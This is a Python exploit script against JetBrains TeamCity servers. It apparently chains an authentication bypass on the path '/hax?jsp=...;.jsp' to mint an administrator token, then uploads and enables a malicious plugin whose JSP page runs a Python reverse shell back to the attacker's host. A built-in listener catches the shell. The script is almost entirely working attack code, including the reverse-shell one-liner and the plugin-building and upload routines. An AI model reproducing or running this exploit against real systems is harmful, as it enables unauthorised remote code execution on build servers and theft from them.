import requests
import zipfile
import io
import re
import argparse
import threading
import socket
import sys
import time
import random
import string
import xml.etree.ElementTree as ET

requests.packages.urllib3.disable_warnings()

# === CONFIG ===
USERNAME = "haxor"
PASSWORD = "haxor"
token_name = "".join(random.choices(string.ascii_letters + string.digits, k=10))
session = requests.Session()
proxy = None  # optional proxy

# === CSRF Token fetch ===
def get_csrf_token(target, token):
    url = f"{target}/authenticationTest.html?csrf"
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    r = session.post(url, headers=headers, verify=False, allow_redirects=False, timeout=60, proxies=proxy)
    if r.status_code == 200:
        return r.text
    return None

# === Build TeamCity plugin ===
def build_plugin_zip(plugin_name: str, lhost: str, lport: int) -> bytes:
    py_rev = (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "import pty;pty.spawn(\"/bin/bash\")'"
    )
    jsp = f"""<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<%
    String op="";
    String query = "{py_rev.replace('"', '\\"')}";
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin = fileSeparator.equals("\\\\");
    try {{
        ProcessBuilder pb;
        if(isWin) {{
            pb = new ProcessBuilder("cmd.exe", "/C", query);
        }} else {{
            pb = new ProcessBuilder("/bin/sh", "-c", query);
        }}
        pb.redirectErrorStream(true);
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\\\A");
        op = sc.hasNext() ? sc.next() : "";
        sc.close();
    }} catch (Exception e) {{
        op = "JSP execution error: " + e.toString();
    }}
%>
<%= op %>
"""

    plugin_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xsi:noNamespaceSchemaLocation="urn:schemas-jetbrains-com:teamcity-plugin-v1-xml">
  <info>
    <name>{plugin_name}</name>
    <display-name>{plugin_name}</display-name>
    <description>CTF evil plugin</description>
    <version>1.0</version>
    <vendor>
      <name>ctf</name>
      <url>http://example.com</url>
    </vendor>
  </info>
  <deployment use-separate-classloader="true" node-responsibilities-aware="true"/>
</teamcity-plugin>
"""

    jar_buf = io.BytesIO()
    with zipfile.ZipFile(jar_buf, "w", zipfile.ZIP_DEFLATED) as jar:
        jar.writestr(f"buildServerResources/{plugin_name}.jsp", jsp)

    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"server/{plugin_name}.jar", jar_buf.getvalue())
        z.writestr("teamcity-plugin.xml", plugin_xml)

    return zip_buf.getvalue()

# === Create auth token ===
def create_token(target, token_name):
    url = f"{target}/hax?jsp=/app/rest/users/id:1/tokens/{token_name};.jsp"
    r = session.post(url, auth=(USERNAME, PASSWORD), verify=False, proxies=proxy)
    if r.status_code == 200:
        print("[+] Token created successfully")
        try:
            root = ET.fromstring(r.text)
            return root.attrib.get("value")
        except:
            return None
    print("[-] Failed to create token:", r.status_code)
    return None

# === Upload plugin ===
def upload_plugin(target, token, csrf_token, plugin_zip, plugin_name):
    url = f"{target.rstrip('/')}/admin/pluginUpload.html"
    headers = {
        "Authorization": f"Bearer {token}",
        "X-TC-CSRF-Token": csrf_token,
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0)"
    }
    files = {
        "fileName": (None, f"{plugin_name}.zip"),
        "file:fileToUpload": (f"{plugin_name}.zip", plugin_zip, "application/zip")
    }
    r = session.post(url, headers=headers, files=files, verify=False, allow_redirects=False, timeout=60, proxies=proxy)
    return r.status_code == 200

# === Fetch plugin UUID ===
def fetch_plugin_uuid(target, token, plugin_name):
    url = f"{target.rstrip('/')}/admin/admin.html?item=plugins"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "Content-Type: application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
        }
    r = session.get(url, headers=headers, verify=False, timeout=60, allow_redirects=False, proxies=proxy)
    if r.status_code != 200:
        return None
    pattern = r"BS\.Plugins\.registerPlugin\('([^']*)', '[^']*',[^,]*,[^,]*,\s*'([^']*)'\);"
    register_plugin_matches = re.findall(pattern, r.text)
    for match in register_plugin_matches:
        if match[0] == plugin_name:
            uuid = match[1]
    return uuid


# === Enable plugin ===
def enable_plugin(target, token, csrf_token, plugin_name):
    uuid = fetch_plugin_uuid(target, token, plugin_name)
    print("uuid", uuid)
    if not uuid:
        print("[-] The plugin just uploaded cannot be obtained. It may have been deleted by the administrator or AV or EDR")
        sys.exit(0)
        
    url = f"{target.rstrip('/')}/admin/plugins.html"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/x-www-form-urlencoded", "X-TC-CSRF-Token": csrf_token}
    data = {"enabled": "true", "action": "setEnabled", "uuid": uuid}
    r = session.post(url, headers=headers, data=data, verify=False, allow_redirects=False, timeout=20, proxies=proxy)
    return r.status_code == 200 and ("loaded successfully" in r.text or "already loaded" in r.text)

# === Trigger JSP shell ===
def trigger_shell(target, plugin_name, token):
    url = f"{target.rstrip('/')}/plugins/{plugin_name}/{plugin_name}.jsp"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = session.get(url, headers=headers, verify=False, timeout=10, proxies=proxy)
        return r.status_code in (200, 302)
    except:
        return False

# === Listener ===
def start_listener(lhost, lport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((lhost, lport))
    sock.listen(1)
    print(f"[+] Listening on {lhost}:{lport} ...")
    conn, addr = sock.accept()
    print(f"[+] Connection from {addr}")
    conn.settimeout(0.5)
    try:
        while True:
            try:
                data = conn.recv(4096)
                if data:
                    sys.stdout.write(data.decode(errors="ignore"))
                    sys.stdout.flush()
            except socket.timeout:
                pass
            try:
                inp = input()
            except EOFError:
                break
            if inp.strip():
                conn.sendall((inp + "\n").encode())
    except KeyboardInterrupt:
        print("\n[!] Listener interrupted")
    finally:
        conn.close()
        sock.close()

def save_plugin_zip(plugin_zip_bytes, plugin_name):
    filename = f"{plugin_name}.zip"
    with open(filename, "wb") as f:
        f.write(plugin_zip_bytes)
    print(f"[+] Plugin zip written to {filename}")
# === Main ===
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-l", "--lhost", required=True)
    parser.add_argument("-p", "--lport", required=True, type=int)
    parser.add_argument("--plugin", default="pwn")
    parser.add_argument("--no-trigger", action="store_true")
    args = parser.parse_args()
    # Start listener
    listener_thread = threading.Thread(target=start_listener, args=(args.lhost, args.lport), daemon=True)
    listener_thread.start()
    time.sleep(1)



    plugin_name = args.plugin
    plugin_zip = build_plugin_zip(args.plugin, args.lhost, args.lport)
    token = create_token(args.target, token_name)
    if not token:
        print("[-] Failed to create token")
        sys.exit(1)

    csrf_token = get_csrf_token(args.target, token)
    if not csrf_token:
        print("[-] Failed to fetch CSRF token")

    save_plugin_zip(plugin_zip, args.plugin)

    if not upload_plugin(args.target, token, csrf_token, plugin_zip, args.plugin):
        print("[-] Upload failed")
        sys.exit(1)

    time.sleep(2)


    if enable_plugin(args.target, token, csrf_token, plugin_name):
        print(f"[+] Plugin {args.plugin} enabled")

    trigger_shell(args.target, plugin_name, token)
    
    if args.no_trigger:
        print("[*] Finished upload/enable. Not triggering JSP.")
        sys.exit(0)

    listener_thread.join()


if __name__ == "__main__":
    main()
